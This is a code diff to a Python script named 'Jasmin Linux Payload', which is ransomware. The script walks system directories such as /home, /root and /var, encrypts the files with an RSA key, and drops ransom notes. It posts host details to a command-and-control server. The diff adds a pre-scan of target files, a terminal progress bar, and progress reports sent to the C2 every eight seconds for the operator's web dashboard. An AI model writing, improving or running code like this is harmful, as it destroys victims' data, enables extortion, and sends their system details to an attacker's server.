@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # Jasmin Linux Payload — Auto-generated
-# 内存安全版：不联网安装依赖(避免编译被OOM杀)，大文件流式加密
-import os,sys,subprocess,struct,hashlib,socket,platform,datetime,json
+# 内存安全版：不联网安装依赖(避免编译被OOM杀)，大文件流式加密，带加密进度条
+import os,sys,subprocess,struct,hashlib,socket,platform,datetime,json,time
 try:import urllib.request,urllib.parse
 except:pass
 
@@ -148,7 +148,75 @@ def drop_notes(dirs,sid):
                 try:open(os.path.join(dp,NOTE_NAME),'w').write(txt)
                 except:pass
 
-def beacon(sid,stats=None):
+# ────────────────────────────────────────
+# 进度条
+# ────────────────────────────────────────
+def _fmt_b(n):
+    try:n=float(n)
+    except:return '0B'
+    for u in ('B','KB','MB','GB','TB'):
+        if n<1024:return ('%.0f%s'%(n,u)) if u=='B' else ('%.2f%s'%(n,u))
+        n/=1024
+    return '%.2fPB'%n
+
+def scan_targets(roots):
+    """预扫描：只统计数量与字节数，不保存路径列表，内存 O(1)"""
+    n=0;total=0
+    for r in roots:
+        if not os.path.isdir(r):continue
+        for dp,_,fs in os.walk(r):
+            for f in fs:
+                fp=os.path.join(dp,f)
+                if skip(fp):continue
+                try:sz=os.path.getsize(fp)
+                except:continue
+                n+=1;total+=sz
+    return n,total
+
+def make_progress(total_files,total_bytes,sid):
+    """返回 (tick, state, finish)。tick(path,size,ok) 每处理一个文件调用一次。
+    周期性回传进度到C2，供Web后台实时进度条使用。"""
+    st={'done':0,'bytes':0,'ok':0,'fail':0}
+    tty=sys.stderr.isatty()
+    last=[time.time()]
+
+    def tick(path,size,ok):
+        st['done']+=1;st['bytes']+=size
+        if ok:st['ok']+=1
+        else:st['fail']+=1
+        if total_bytes>0:pct=st['bytes']*100.0/total_bytes
+        elif total_files>0:pct=st['done']*100.0/total_files
+        else:pct=100.0
+        if pct>100.0:pct=100.0
+        if tty:
+            try:cols=os.get_terminal_size().columns
+            except:cols=100
+            barw=28
+            fill=int(pct*barw/100.0)
+            bar='█'*fill+'░'*(barw-fill)
+            cur=path
+            if len(cur)>34:cur='…'+cur[-33:]
+            line='  [%s] %5.1f%%  %d/%d  %s/%s  %s'%(bar,pct,st['done'],total_files,_fmt_b(st['bytes']),_fmt_b(total_bytes),cur)
+            if len(line)>cols-1:line=line[:cols-1]
+            sys.stderr.write('\r'+line)
+        else:
+            if st['done']%50==0 or st['done']==total_files:
+                sys.stderr.write('[jasmin] %5.1f%% (%d/%d) %s/%s\n'%(pct,st['done'],total_files,_fmt_b(st['bytes']),_fmt_b(total_bytes)))
+        try:sys.stderr.flush()
+        except:pass
+        now=time.time()
+        if now-last[0]>=8:  # 每8秒回传一次进度
+            last[0]=now
+            beacon(sid,None,{'ok':st['ok'],'bytes':st['bytes'],'total':total_files,'total_bytes':total_bytes})
+
+    def finish():
+        if tty:
+            sys.stderr.write('\n')
+            try:sys.stderr.flush()
+            except:pass
+    return tick,st,finish
+
+def beacon(sid,stats=None,prog=None):
     try:
         d={'handshake':SECRET,'machine_name':socket.gethostname(),'computer_user':os.getenv('USER','?'),
            'os':f'{platform.system()} {platform.release()}','date':datetime.datetime.now().strftime('%d/%m/%Y, %A'),
@@ -156,11 +224,22 @@ def beacon(sid,stats=None):
            'systemid':sid,'password':'RSA_PROTECTED'}
         try:d['ip']=urllib.request.urlopen('https://api.ipify.org',timeout=5).read().decode()
         except:pass
+        if prog:
+            # 进行中：回传实时进度
+            d['encrypted_count']=str(prog['ok'])
+            d['encrypted_size']=str(prog['bytes'])
+            d['total_count']=str(prog['total'])
+            d['total_size']=str(prog['total_bytes'])
+            d['is_complete']='0'
         if stats:
+            # 完成：回传最终统计
             d['encrypted_count']=str(stats['count'])
             d['encrypted_size']=str(stats['size'])
             d['encrypted_types']=','.join(sorted(stats['types']))
             d['encrypted_detail']=json.dumps(stats.get('detail',{}))
+            d['total_count']=str(stats.get('total_count',stats['count']))
+            d['total_size']=str(stats.get('total_size',stats['size']))
+            d['is_complete']='1'
         req=urllib.request.Request(C2,data=urllib.parse.urlencode(d).encode(),method='POST')
         urllib.request.urlopen(req,timeout=10)
     except:pass
@@ -173,22 +252,38 @@ def main():
         td=_tf.mkdtemp();pub_pem_path=os.path.join(td,'pub.pem')
         open(pub_pem_path,'wb').write(RSA_PUB)
     sid=get_sid()
-    stats={'count':0,'size':0,'types':set(),'detail':{}}
     roots=['/home','/root','/var','/opt','/tmp','/srv']
-    for r in roots:
-        if not os.path.isdir(r):continue
-        for dp,_,fs in os.walk(r):
-            for f in fs:
-                fp=os.path.join(dp,f)
-                try:sz=os.path.getsize(fp)
-                except:sz=0
-                if encrypt(fp,pub_obj,pub_pem_path):
-                    stats['count']+=1;stats['size']+=sz
-                    _,e=os.path.splitext(f)
-                    if e:
-                        e=e.lower();stats['types'].add(e)
-                        if e not in stats['detail']:stats['detail'][e]={'count':0,'size':0}
-                        stats['detail'][e]['count']+=1;stats['detail'][e]['size']+=sz
+
+    # ── 阶段1: 预扫描（统计总数，用于进度条分母） ──
+    sys.stderr.write('[jasmin] 正在扫描目标文件...\n')
+    n_total,b_total=scan_targets(roots)
+    sys.stderr.write('[jasmin] 发现 %d 个目标文件，合计 %s\n'%(n_total,_fmt_b(b_total)))
+
+    stats={'count':0,'size':0,'types':set(),'detail':{},'total_count':n_total,'total_size':b_total}
+
+    if n_total>0:
+        # ── 阶段2: 加密（带实时进度条） ──
+        tick,pst,finish=make_progress(n_total,b_total,sid)
+        for r in roots:
+            if not os.path.isdir(r):continue
+            for dp,_,fs in os.walk(r):
+                for f in fs:
+                    fp=os.path.join(dp,f)
+                    if skip(fp):continue
+                    try:sz=os.path.getsize(fp)
+                    except:sz=0
+                    ok=encrypt(fp,pub_obj,pub_pem_path)
+                    tick(fp,sz,ok)
+                    if ok:
+                        stats['count']+=1;stats['size']+=sz
+                        _,e=os.path.splitext(f)
+                        if e:
+                            e=e.lower();stats['types'].add(e)
+                            if e not in stats['detail']:stats['detail'][e]={'count':0,'size':0}
+                            stats['detail'][e]['count']+=1;stats['detail'][e]['size']+=sz
+        finish()
+        sys.stderr.write('[jasmin] 加密完成: %d/%d 个文件, %s / %s\n'%(stats['count'],n_total,_fmt_b(stats['size']),_fmt_b(b_total)))
+
     note_dirs=roots+[os.path.expanduser('~')]
     try:
         for u in os.listdir('/home'):
